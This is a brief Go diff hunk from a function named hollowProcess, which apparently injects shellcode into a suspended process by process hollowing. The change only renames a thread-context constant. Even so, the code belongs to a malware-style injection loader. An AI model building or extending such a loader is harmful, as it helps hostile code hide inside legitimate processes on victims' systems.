@@ -73,7 +73,7 @@ func hollowProcess(targetPath string, shellcode []byte) error {
 	}
 
 	var ctx threadContext
-	ctx.contextFlags = CONTEXT_FULL
+	ctx.contextFlags = contextFull
 	r4, _, _ := procGetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
 	if r4 == 0 {
 		procTerminateProcess.Call(hProc, 1)
